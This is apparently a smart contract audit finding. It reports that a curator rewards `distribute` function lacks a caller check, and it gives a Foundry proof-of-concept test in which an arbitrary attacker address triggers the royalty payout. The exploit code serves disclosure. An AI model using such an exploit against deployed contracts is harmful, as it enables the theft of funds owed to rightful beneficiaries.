# Vulnerability details

## Impact

The function `distribute` doesn't check `msg.sender`, so anyone could call this function with a valid `credId` to receive royaltyfee  should belong to a specific beneficiary.

## Proof of Concept

```
    function testattack() public {
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;

        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

        vm.startPrank(user1);
        vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
        vm.stopPrank();

        vm.startPrank(user2);
        vm.deal(user2, bondingCurve.getBuyPriceAfterFee(credId, 2, 2));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 2, 2) }(credId, 2, 0);
        vm.stopPrank();

        address attacker = address(0xffff);
        vm.prank(attacker); 
        vm.deal(attacker, 0);
        curatorRewardsDistributor.distribute(credId); 
        assertEq(attacker.balance, 0); // it should be 0, but attacker received token by calling distribute
    }
```
